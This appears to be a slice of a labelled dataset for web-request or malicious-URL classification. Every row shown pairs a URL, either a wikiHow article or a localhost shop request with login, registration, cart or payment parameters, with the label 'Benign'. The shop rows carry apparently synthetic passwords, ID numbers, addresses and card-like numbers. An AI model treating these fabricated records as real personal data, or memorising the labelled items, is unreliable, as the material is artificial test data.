http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1444&b1=pasar+por+caja,Benign
http://www.wikihow.com/publish-your-multimedia-work&t=1396533771223&n=1129381&k=mainentity,Benign
http://www.wikihow.com/be-friends-with-a-girl-who-smokes&t=1396571451474&n=2988729&k=mainentity,Benign
http://www.wikihow.com/date-a-wealthy-woman&t=1396570750107&n=2959941&k=mainentity,Benign
http://www.wikihow.com/make-bed-head-waves-for-african-american-girls&t=1396592904630&n=3856631&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=armando&password=7g7ai9ador&nombre=erberto&apellidos=delem%fas+picornel&email=junasz1%40barcas-hibridas.mobi&dni=12765802c&direccion=calle+rioja%2c+149+&ciudad=mas%f3%2c+la&cp=05134&provincia=valladolid&ntc=8096995007175801&b1=registrar,Benign
http://www.wikihow.com/get-clothing-no-one-else-has&t=1396518000130&n=353458&k=mainentity,Benign
http://www.wikihow.com/get-a-guy-when-he%27s-an-enemy&t=1396570659877&n=2956249&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5357&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1199&b1=pasar+por+caja,Benign
http://www.wikihow.com/build-a-carrot-farm-and-barn-in-animal-jam&t=1396648245022&n=5957803&k=mainentity,Benign
http://www.wikihow.com/enjoy-a-day-at-puyallup-fair&t=1396527898157&n=852597&k=mainentity,Benign
http://www.wikihow.com/take-advantage-of-tax-breaks-on-hybrid-vehicles&t=1396630751637&n=5463844&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=100&cantidad=98&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-a-puppy%27s-first-day-go-well&t=1396516764008&n=269812&k=mainentity,Benign
http://www.wikihow.com/make-a-bathroom-green&t=1396562269377&n=2537520&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=van_nest&pwd=layetano&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wakim2&password=933a%f1o&nombre=rachel&apellidos=lillo+de+manuel&email=milne%40cropbay.hu&dni=52603360z&direccion=pulgarin+alto%2c+76+3%3fa&ciudad=canencia&cp=09245&provincia=%c1vila&ntc=9642283228449957&b1=registrar,Benign
http://www.wikihow.com/stay-safe-while-surfing--the-net&t=1396526733078&n=798430&k=mainentity,Benign
http://www.wikihow.com/be-happy-even-in-unhappy-moments&t=1396516215167&n=242818&k=mainentity,Benign
http://www.wikihow.com/obtain-speaking-opportunities-in-trade-shows&t=1396527403971&n=833022&k=mainentity,Benign
http://www.wikihow.com/record-a-webinar-with-apowersoft-screen-recorder&t=1396534113898&n=1144549&k=mainentity,Benign
http://www.wikihow.com/cope-with-rejection-(for-guys)&t=1396612229351&n=4780494&k=mainentity,Benign
http://www.wikihow.com/be-a-messenger&t=1396571376752&n=2986029&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=100&cantidad=4&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kungchia&password=opalino&nombre=claro&apellidos=olivares+jull%e1&email=benny%40lawn.ph&dni=39890773x&direccion=paseo+rinconada%2c+29+4%3fb&ciudad=v%edcar&cp=23230&provincia=zamora&ntc=6914714938050640&b1=registrar,Benign
http://www.wikihow.com/deal-with-not-knowing&t=1396569920132&n=2926197&k=mainentity,Benign
http://www.wikihow.com/put-missing-pet-ads-online&t=1396532322936&n=1060134&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rora&password=9a25ie514&nombre=emmanuelle&apellidos=casselin&email=mcclanahan%40comodindelhogar.sy&dni=72047562q&direccion=pasaje+amantillo+166+5%3fb&ciudad=tabanera+la+luenga&cp=49519&provincia=teruel&ntc=9884100419399604&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=36&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/identify-a-credible-psychic-medium&t=1396569758952&n=2918773&k=mainentity,Benign
http://www.wikihow.com/play-doublets&t=1396546975228&n=1734968&k=mainentity,Benign
http://www.wikihow.com/get-friend-zoned-by-a-foreign-exchange-student-college-edition&t=1396571499786&n=2990309&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tupling&password=v12uid3&nombre=balbino&apellidos=egu%eda+vive&email=nurk%40cirugiaplasticacordoba.mw&dni=46659603d&direccion=c%2f+serrano+flores+190+&ciudad=sinlabajos&cp=47112&provincia=vizcaya&ntc=4185244507632917&b1=registrar,Benign
http://www.wikihow.com/help-a-friend-through-hard-times&t=1396571410981&n=2987297&k=mainentity,Benign
http://www.wikihow.com/install-a-heat-detector-in-your-house&t=1396562794804&n=2572868&k=mainentity,Benign
http://www.wikihow.com/create-a-meez-account&t=1396648060318&n=5949703&k=mainentity,Benign
http://www.wikihow.com/choose-a-computer-case&t=1396531912673&n=1042418&k=mainentity,Benign
http://www.wikihow.com/like-and-accept-hugs&t=1396571582269&n=2993637&k=mainentity,Benign
http://www.wikihow.com/make-a-%22clean-day%22-for-your-computer&t=1396532798289&n=1081628&k=mainentity,Benign
http://www.wikihow.com/decide-between-assigned-risk-and-non-standard-car-insurance&t=1396613273646&n=4812303&k=mainentity,Benign
http://www.wikihow.com/organize-a-master-bedroom-closet&t=1396563105811&n=2592456&k=mainentity,Benign
http://www.wikihow.com/dress-fashionably-in-a-party&t=1396546628154&n=1716096&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=haskins&pwd=kil%f3metro&remember=off&b1=entrar,Benign
http://www.wikihow.com/get-lots-of-money-in-x-com:-ufo-defense&t=1396648494075&n=5968407&k=mainentity,Benign
http://www.wikihow.com/pray-the-rosary-as-a-family&t=1396569680432&n=2915145&k=mainentity,Benign
http://www.wikihow.com/smoothe-and-exfoilate-dry-skin&t=1396593984336&n=3917368&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yuchiang2&password=alza%2bdura&nombre=monserrat&apellidos=sacido&email=nowland_aadland%40sunmiles.ru&dni=93748200q&direccion=c%2f+viver%2c+25+6%3fh&ciudad=santiago+del+tormes&cp=19237&provincia=pontevedra&ntc=6174509890072023&b1=registrar,Benign
http://www.wikihow.com/keep-fruit-from-turning-brown&t=1396517508077&n=319791&k=mainentity,Benign
http://www.wikihow.com/make-a-spruce-cocktail&t=1396545769311&n=1660360&k=mainentity,Benign
http://www.wikihow.com/make-lawn-clipping-tea&t=1396561603956&n=2498892&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6913&b1=confirmar,Benign
http://www.wikihow.com/get-all-the-unlockable-characters-in-kingdom-hearts-358/2-days&t=1396649070079&n=5990250&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=walles&password=pop%e9s&nombre=nahir&apellidos=lloreda+nuda&email=smart%40mercadozoom.gs&dni=98051955b&direccion=antonio+moya+albaladejo%2c+189%2c+3%3fh&ciudad=valle+de+cerrato&cp=44164&provincia=almer%eda&ntc=3948328694304840&b1=registrar,Benign
http://www.wikihow.com/create-and-use-groups-on-socialcast&t=1396630024555&n=5443153&k=mainentity,Benign
http://www.wikihow.com/personalize-your-tan&t=1396594044092&n=3920176&k=mainentity,Benign
http://www.wikihow.com/make-panner-butter-masala&t=1396515664425&n=205557&k=mainentity,Benign
http://www.wikihow.com/handle-fillo-pastry-(phyllo-dough)&t=1396595042976&n=3968355&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=382&b1=confirmar,Benign
http://www.wikihow.com/make-a-airplane-in-minecraft&t=1396648476911&n=5967735&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8808&b1=pasar+por+caja,Benign
http://www.wikihow.com/help-your-kids-organize-toys&t=1396563093265&n=2591724&k=mainentity,Benign
http://www.wikihow.com/get-quake-4-to-work-on-windows-vista&t=1396648579755&n=5972611&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6225&b1=pasar+por+caja,Benign
http://www.wikihow.com/bake-oatmeal-bread&t=1396594881273&n=3952567&k=mainentity,Benign
http://www.wikihow.com/make-a-cheap-irrigation-system&t=1396563757650&n=2633170&k=mainentity,Benign
http://www.wikihow.com/make-bots-setup-on-black-ops-2-so-you-can-trickshot&t=1396649414477&n=6002507&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6505&b1=pasar+por+caja,Benign
http://www.wikihow.com/remove-the-links-toolbar&t=1396532427278&n=1064842&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=beaufort&password=albarcoque&nombre=camel&apellidos=corbera+bocas&email=fiorentini_bologna%40enformetera.com.pe&dni=43820167s&direccion=c%2f+de+los+colegios%2c+192+&ciudad=sarri%f3n&cp=41120&provincia=cuenca&ntc=7322786921106318&b1=registrar,Benign
http://www.wikihow.com/get-back-to-school-lips&t=1396593749719&n=3905132&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=oreilly0&pwd=inexhausto&remember=off&b1=entrar,Benign
http://www.wikihow.com/appreciate-everything-about-harry-potter&t=1396633338407&n=5524737&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=morearty&password=a085628o&nombre=johanna&apellidos=polo+butticaz&email=hilsdon-cano%40satellites.va&dni=49254323f&direccion=cami+d%27+esplugues+147+13%3fa&ciudad=higuera+de+las+due%f1as&cp=39790&provincia=navarra&ntc=6732076247233294&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4945&b1=confirmar,Benign
http://www.wikihow.com/tell-someone-you-don%27t-want-to-be-their-friend&t=1396571695329&n=2997785&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=anupam&pwd=ca96hue25&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-a-successful-club-on-a-virtual-pet-site&t=1396648838519&n=5984631&k=mainentity,Benign
http://www.wikihow.com/buy-in-bulk-and-save-money&t=1396545933642&n=1670296&k=mainentity,Benign
http://www.wikihow.com/keep-spices-fresh&t=1396546152340&n=1682460&k=mainentity,Benign
http://www.wikihow.com/make-bread-in-a-bag&t=1396594913656&n=3955291&k=mainentity,Benign
http://www.wikihow.com/make-a-lot-of-meat-in-kingdom-of-loathing&t=1396630217105&n=5450989&k=mainentity,Benign
http://www.wikihow.com/earn-free-ecoins-on-fantage&t=1396648110101&n=5951727&k=mainentity,Benign
http://www.wikihow.com/clean-a-jetted-spa-using-spa-rx&t=1396563967296&n=2644786&k=mainentity,Benign
http://www.wikihow.com/learn-the-keyboard-shortcuts-on-sherwood-dungeon&t=1396532310407&n=1059658&k=mainentity,Benign
http://www.wikihow.com/make-a-dynasty-in-ncaa-football&t=1396649155002&n=5992091&k=mainentity,Benign
http://www.wikihow.com/make-a-cookies-and-cream-as-whipped-cream&t=1396515702946&n=208717&k=mainentity,Benign
http://www.wikihow.com/cosplay-as-ronald-knox&t=1396528187009&n=866609&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=15&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-a-gang-in-grand-theft-auto:-san-andreas&t=1396649455870&n=6004078&k=mainentity,Benign
http://www.wikihow.com/convert-b2evolution-to-wordpress-with-automated-service-cms2cms&t=1396533849270&n=1132409&k=mainentity,Benign
http://www.wikihow.com/buy-sprint-booster&t=1396533497829&n=1116069&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hardage&password=_abarloar&nombre=spencer&apellidos=formenti&email=bridge-sanford%40aeag.cn&dni=04549345z&direccion=francoli+148%2c+&ciudad=amurrio&cp=39627&provincia=soria&ntc=9379365296048571&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=100&cantidad=46&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/have-a-birthday-party-during-the-summer-for-kids&t=1396546868498&n=1729516&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yukiko&pwd=p%e9ndula&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lehrbaum&pwd=gigantea&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rejeanne&pwd=d6917bi52to&remember=on&b1=entrar,Benign
http://www.wikihow.com/share-a-laptop&t=1396532655864&n=1074176&k=mainentity,Benign
http://www.wikihow.com/improve-the-safety-of-a-tree-house&t=1396563688855&n=2628998&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=beppie&pwd=tizonada&remember=off&b1=entrar,Benign
http://www.wikihow.com/enable-cookies-in-windows-7&t=1396611016387&n=4740426&k=mainentity,Benign
http://www.wikihow.com/copy-and-paste-on-facebook&t=1396531747823&n=1033742&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=costanza&password=chilena&nombre=rihito&apellidos=olmo+o%27kuinghttons&email=tonnawannij%40magadan.org.sz&dni=12671973p&direccion=san+lorenzo%2c+111%2c+&ciudad=berrobi&cp=47175&provincia=madrid&ntc=1394573738510797&b1=registrar,Benign
http://www.java2s.com/tutorial/java/0360__jsp/1040__database.htm,Benign
http://www.wikihow.com/be-a-zombie-on-club-penguin&t=1396630330720&n=5452659&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=anne-lis&pwd=ar4s5%ed9&remember=on&b1=entrar,Benign
http://www.wikihow.com/kill-slugs-with-frogs-and-toads&t=1396561703974&n=2505100&k=mainentity,Benign
http://www.wikihow.com/get-silly-string-out-of-your-hair&t=1396592797146&n=3851471&k=mainentity,Benign
http://www.wikihow.com/make-bots-setup-on-black-ops-2&t=1396649409354&n=6002283&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2854&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6739&b1=pasar+por+caja,Benign
http://www.wikihow.com/get-a-14-year-old-boy-to-like-you&t=1396611968005&n=4770154&k=mainentity,Benign
http://www.wikihow.com/go-green-with-techniques-on-home-and-garden-improvements&t=1396562789847&n=2572572&k=mainentity,Benign
http://www.wikihow.com/make-belton-enchiladas&t=1396613964398&n=4838356&k=mainentity,Benign
http://www.wikihow.com/get-a-banshee-into-the-boss-at-the-end-of-halo-2&t=1396649500180&n=6006006&k=mainentity,Benign
http://www.wikihow.com/make-blackberry-ice-cream-in-harvest-moon:-animal-parade&t=1396649545081&n=6007718&k=mainentity,Benign
http://www.wikihow.com/fix-pc-internet-connection-without-rebooting&t=1396532858078&n=1084452&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rami&password=325t48i7o&nombre=vladimiro&apellidos=cipr%e9s+boero&email=donovan%40evasor.gn&dni=25858495d&direccion=calle+javier+de+burgos+133%2c+12%3fd&ciudad=esgos&cp=49708&provincia=segovia&ntc=5339007056480954&b1=registrar,Benign
http://www.wikihow.com/cook-biryani-masala-mixed-vegetables&t=1396526946120&n=809904&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ngaingai&password=a9ro657a&nombre=isadora&apellidos=tenorio+lacavex&email=leite.hightower%40ccalzamora.br&dni=35912531d&direccion=travessera+hospital+s%2fn+12%3ff&ciudad=robledillo+de+mohernando&cp=39728&provincia=almer%eda&ntc=0605340234383750&b1=registrar,Benign
http://www.wikihow.com/assess-battery-manufacturers-in-india&t=1396532887912&n=1085952&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ertl&password=lenificaci*%f3n&nombre=ruff&apellidos=brunat+juv%e9&email=chernovalenko9%40parcalia.cat&dni=62371303h&direccion=calle+ceravalls+176+&ciudad=llers&cp=42218&provincia=barcelona&ntc=3582656245563553&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3871&b1=confirmar,Benign
http://www.wikihow.com/prepare-a-child-for-dating&t=1396611764019&n=4762560&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1890&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8963&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7569&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=suzi&password=551%edn&nombre=gorgonio&apellidos=costajuss%e0+samaniego&email=frederici_gillespie%40audiosat.us&dni=35981199e&direccion=estrella+sirio+177%2c+&ciudad=santa+gadea+del+cid&cp=19353&provincia=segovia&ntc=7806141465394091&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=perrella&pwd=v*%e9spero&remember=off&b1=entrar,Benign
http://www.wikihow.com/do-basic-things-in-windows-vista&t=1396610797651&n=4730070&k=mainentity,Benign
http://www.wikihow.com/put-documents-on-your-kindle-without-the-internet&t=1396633284740&n=5522253&k=mainentity,Benign
http://www.wikihow.com/get-prepared-before-buying-roblox-bc&t=1396647890787&n=5941495&k=mainentity,Benign
http://www.wikihow.com/unflatten-a-plane-in-sculptris&t=1396630375633&n=5453895&k=mainentity,Benign
http://www.wikihow.com/be-like-a-nurse-when-you-are-a-kid&t=1396528216061&n=868297&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9298&b1=confirmar,Benign
http://www.wikihow.com/cosplay-as-marie-antoinette&t=1396528068345&n=860873&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=85&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-coconut-and-rhubarb-muffins&t=1396595200206&n=3980823&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1797&b1=pasar+por+caja,Benign
http://www.wikihow.com/deal-with-being-the-new-girl/boy-in-town&t=1396571483137&n=2989817&k=mainentity,Benign
http://www.wikihow.com/use-online-color-resources&t=1396532443689&n=1065562&k=mainentity,Benign
http://www.wikihow.com/give-your-hair-a-summery-look&t=1396516461348&n=254518&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2753&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=carline&pwd=embrochado&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=laure&password=i8e71o%2b0i13b17&nombre=leig&apellidos=borrel+lowery&email=schwoegler%40superstarsgroup.net&dni=44482694g&direccion=c%2f+valparaiso%2c+38%2c+4-h&ciudad=pe%f1amellera+alta&cp=42107&provincia=cuenca&ntc=2397290594537988&b1=registrar,Benign
http://www.wikihow.com/make-a-black-eye-with-makeup&t=1396593708024&n=3903120&k=mainentity,Benign
http://www.wikihow.com/create-good-sensations&t=1396631250688&n=5477864&k=mainentity,Benign
http://www.wikihow.com/become-a-youtube-commentator&t=1396630087126&n=5445697&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ianthe&password=e4pi96a3&nombre=leocadio&apellidos=guimarey+g%e1llego&email=fall.bosacker%40redhost.ie&dni=12852429y&direccion=calle+gran+poder%2c+35+10g&ciudad=masies+de+roda%2c+les&cp=09450&provincia=madrid&ntc=9118174578374133&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=amelina&password=g9tan8&nombre=johinna&apellidos=brito+abert&email=zalata%40lunch.com.jo&dni=25656454t&direccion=avinguda+portugal%2c+55+1%3fe&ciudad=ri%f3s&cp=08281&provincia=alicante&ntc=8774749278025391&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=85&cantidad=95&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9421&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=88&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/know-what-you%27re-doing-when-you%27re-ghost-hunting&t=1396569801834&n=2920465&k=mainentity,Benign
http://www.wikihow.com/use-windows-to-go-in-windows-8&t=1396611399497&n=4752801&k=mainentity,Benign
http://www.wikihow.com/make-an-installer-with-advancedinstaller.com&t=1396532068288&n=1049402&k=mainentity,Benign
http://www.wikihow.com/change-the-colour-of-highlight-(macs)&t=1396533205449&n=1103136&k=mainentity,Benign
http://www.wikihow.com/protect-your-facebook-friends&t=1396631912966&n=5491948&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ricca&password=es26sa&nombre=acacio&apellidos=mol%e9s+llubet&email=bervil-berkel%40boda-barata.sn&dni=96003284l&direccion=comercio+45+&ciudad=sobrado&cp=45950&provincia=guadalajara&ntc=8862208467405962&b1=registrar,Benign
http://www.wikihow.com/use-cloud9&t=1396534123405&n=1145053&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=anastass&pwd=en06a9&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=matilde13&pwd=extrema&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100&cantidad=74&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/use-fibonacci-for-intraday-forex-trading&t=1396613379213&n=4816015&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hattie&password=%24mezquino&nombre=sulamita&apellidos=puigferrer+ulldemol&email=lamond%40movilgoogle.ir&dni=91502752n&direccion=calle+fray+hernando+de+talavera%2c+155+&ciudad=ventrosa&cp=05560&provincia=barcelona&ntc=8821878942336286&b1=registrar,Benign
http://www.wikihow.com/delete-an-attachment-on-socialcast&t=1396630026440&n=5443217&k=mainentity,Benign
http://www.wikihow.com/ditch-a-guy-who%27s-trying-to-grind-with-you&t=1396612188296&n=4779106&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rotzjean&password=monta6gar&nombre=janis&apellidos=norte+paz&email=kartolian%40paremoselalzheimer.wf&dni=84222735r&direccion=pasaje+debora%2c+160+5d&ciudad=villanueva+de+la+vera&cp=06473&provincia=almer%eda&ntc=0681382586401498&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alden9&pwd=t8i5r9m5a&remember=on&b1=entrar,Benign
http://www.wikihow.com/fix-a-frozen-safari-on-ipad&t=1396534213695&n=1149206&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bayola&pwd=me7o4ca45&remember=off&b1=entrar,Benign
http://www.wikihow.com/kiss-your-boyfriend-for-the-first-time-(middle-school-girl-guide)&t=1396570970375&n=2969189&k=mainentity,Benign
http://www.wikihow.com/make-use-of-lip-gloss&t=1396593788827&n=3906924&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=laural&pwd=6ach0rro&remember=off&b1=entrar,Benign
http://www.wikihow.com/create-a-cozy-bathroom&t=1396562263564&n=2537264&k=mainentity,Benign
http://www.wikihow.com/be-a-%27great%27-friend&t=1396571281543&n=2982481&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=count&password=j3rga&nombre=axel&apellidos=orpinell+c%e1rcamo&email=offenbach%40esmeraldas.org.ki&dni=70291181f&direccion=c%2f+andres+bello%2c+92%2c+6c&ciudad=carmona&cp=09199&provincia=c%e1ceres&ntc=7578317225129000&b1=registrar,Benign
http://www.wikihow.com/decorate-a-mirror-with-cute-covers&t=1396562049173&n=2525004&k=mainentity,Benign
http://www.wikihow.com/reshape-a-plane-in-sculptris&t=1396630371095&n=5453699&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=27&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/drive-a-truck-as-a-paralysed-person&t=1396531462486&n=1021977&k=mainentity,Benign
http://www.wikihow.com/avoid-data-loss-d-day&t=1396532811986&n=1082284&k=mainentity,Benign
http://www.wikihow.com/cosplay-as-claudia-from-the-baby-sitters-club&t=1396528156656&n=865293&k=mainentity,Benign
http://www.wikihow.com/make-a-cherry-cheese-pie&t=1396515773906&n=213837&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=deakin&password=j%f3nico&nombre=herm%f3genes&apellidos=masoliv%e9+nufio&email=lesser-givney4%40clubdeviaje.fi&dni=98144612r&direccion=paseo+de+las+moreras%2c+96%2c+4c&ciudad=salvador+de+zapardiel&cp=36790&provincia=badajoz&ntc=9999557834556694&b1=registrar,Benign
http://www.wikihow.com/act-and-look-like-a-biker-from-teen-beach-movie&t=1396528329131&n=875221&k=mainentity,Benign
http://www.wikihow.com/carefully-pick-paid-games-in-ipad&t=1396534178997&n=1147845&k=mainentity,Benign
http://www.wikihow.com/play-nancy-drew-games-effectively&t=1396633579641&n=5531749&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carver&password=haz2er7e4r&nombre=silveria&apellidos=de+vitorio+vilardell&email=lewis.canova%40professionalhost.cl&dni=53819329l&direccion=c%2f+guillermo+de+osma+s%2fn+&ciudad=leci%f1ena&cp=45635&provincia=huesca&ntc=0070151205403865&b1=registrar,Benign
http://www.wikihow.com/spine-transfer-on-a-scooter&t=1396531430760&n=1020257&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=guoming&pwd=9039zog7r&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=krogh&password=indogerm%e1nico&nombre=quiliana&apellidos=araneda+cavaliere&email=hagerty%40ciaplast.lu&dni=81741185j&direccion=plza.+maria+josefa+recio+93+&ciudad=villabuena+de+%c1lava%2feskuernaga&cp=47600&provincia=barcelona&ntc=6692316683955675&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=giambera&pwd=alechugada&remember=off&b1=entrar,Benign
http://www.wikihow.com/get-an-autograph-from-mickey-at-the-disney-parks&t=1396527973296&n=855613&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=valentia&password=desarrebujar&nombre=quirino&apellidos=bussot+carbon%e9s&email=sirichanya%40vinavilano.pe&dni=49192685d&direccion=plaza+martinez+tornel%2c+67+11-h&ciudad=bouza%2c+la&cp=37291&provincia=c%e1ceres&ntc=0958355967600511&b1=registrar,Benign
http://www.wikihow.com/hide-and-unhide-folders-in-windows-very-secretly&t=1396611085285&n=4743489&k=mainentity,Benign
http://www.wikihow.com/draw-blood-from-an-adult-fish&t=1396547274827&n=1759052&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=amouzgar&password=194e&nombre=genera&apellidos=urraza+bodnar&email=cher%40pasajesaereosbaratos.bb&dni=22231533d&direccion=bajada+sacramento+180%2c+&ciudad=hornachos&cp=25134&provincia=lugo&ntc=9329486529592970&b1=registrar,Benign
http://www.wikihow.com/conceal-a-nail-head-in-wood&t=1396562719919&n=2568004&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jenna&password=de%211oda8a&nombre=natana&apellidos=knezevich&email=morissette4%40altoguadiana.my&dni=70983105e&direccion=calle+general+bohorquez+94%2c+&ciudad=bu%f1uel&cp=43720&provincia=granada&ntc=2557208340585733&b1=registrar,Benign
http://www.wikihow.com/reach-relevant-bloggers-using-a-blogs-release-and-distribution-platform&t=1396532329930&n=1060242&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=engelber&password=cameliea&nombre=harissa&apellidos=guarderas+bolivar&email=finklestein%40intg.ac&dni=70754396w&direccion=c%2f+estrella+polar%2c+139%2c+11%3fa&ciudad=almendralejo&cp=23649&provincia=valencia&ntc=6905475964358006&b1=registrar,Benign
http://www.wikihow.com/bless-a-house&t=1396569655761&n=2914089&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=plucinsk&password=des9nlazar&nombre=rogelia&apellidos=ridoutt+tellado&email=latell%40visualreality.lr&dni=30571914s&direccion=calle+padre+pascual+suarez%2c+s%2fn%2c+11%3fc&ciudad=arnuero&cp=47419&provincia=valencia&ntc=3212381335432418&b1=registrar,Benign
http://www.wikihow.com/kill-more-than-30-boomers-in-left-4-dead-(the-apartments)&t=1396648554322&n=5971327&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1871&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=88&b1=confirmar,Benign
